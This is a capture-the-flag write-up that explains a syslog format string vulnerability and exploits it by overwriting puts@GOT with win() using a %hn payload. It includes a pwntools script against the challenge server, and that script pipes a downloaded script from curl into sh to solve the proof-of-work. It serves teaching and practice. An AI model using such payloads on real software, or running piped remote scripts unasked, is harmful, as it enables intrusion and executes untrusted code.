# Logging Lover — CTF Writeup

## Summary
The binary contains a classic format string vulnerability in its logging path. User input is passed directly to `syslog()` as the format string, which allows arbitrary format specifiers and `%n` writes.

By overwriting `puts@GOT` with the address of `win()`, the next `puts()` call redirects execution into the flag-reading routine. The fake `logging_lover/flag.txt` in the archive is a decoy; the real flag is obtained remotely from `./deploy/flag.txt`.

## Vulnerability / Root Cause
- `main()` reads up to 511 bytes with `fgets()`.
- The input is passed to `log_message()`.
- `log_message()` calls `syslog(3, user_input)` instead of `syslog(3, "%s", user_input)`.

This makes the payload a format string, so we can:
1. leak data,
2. write memory using `%n` / `%hn`,
3. redirect control flow.

## Relevant Binary Behavior
The binary is:
- `amd64`
- `No PIE`
- `NX enabled`
- `No canary`
- `Partial RELRO`

Important detail: `main()` passes extra arguments to `log_message()`:
- `puts@GOT`
- `puts@GOT + 2`
- `puts@GOT + 4`
- `win`

So the attacker-controlled format string can directly write the 64-bit `win()` address into `puts@GOT` using `%hn` writes.

## Exploitation Methodology
1. Solve the remote proof-of-work.
2. Send a format string payload that writes `0x401285` into `puts@GOT`.
3. Let the program continue normally.
4. The next `puts()` call jumps to `win()`.
5. `win()` tries `/flag`, then `./flag.txt`, then `./deploy/flag.txt`.
6. On the remote service, the first two paths fail and the final path succeeds, printing the real flag.

## Payload
Used payload:

```text
%3$hn%1$64c%2$hn%1$4677c%1$hn
```

This writes:
- low 16 bits of `win`
- middle 16 bits of `win`
- high 16 bits of `win`

into `puts@GOT` via the supplied arguments.

## Verification Evidence
Reproduced remote output:

```text
=== admin debug channel ===
FYPCTF26{fmt_strings_are_logging_superpowers}
```

The decoy file in the archive contains:

```text
FYPCTF26{fake_flag}
```

This is not the real answer; it only confirms the archive includes a fake/local file for misdirection.

## Minimal Repro Steps
```bash
python3 - <<'PY'
from pwn import *
import re, subprocess

context.log_level='error'
p = remote('challenge.hacktheflag.one', 30009)
banner = p.recvuntil(b'solution: ')
m = re.search(rb'sh -s (\S+)', banner)
token = m.group(1).decode()
sol = subprocess.check_output(
    f"curl -sSfL https://pwn.red/pow | sh -s {token}",
    shell=True,
    text=True
).strip().splitlines()[-1]

p.sendline(sol.encode())
p.recvuntil(b'log #1> ')
p.sendline(b'%3$hn%1$64c%2$hn%1$4677c%1$hn')
print(p.recvall(timeout=8).decode('latin-1', errors='replace'))
PY
```

## Assumptions / Caveats
- Remote service requires PoW before interaction.
- The exploit assumes the shipped binary matches the remote service.
- The flag is revealed only after control flow is redirected into `win()`.
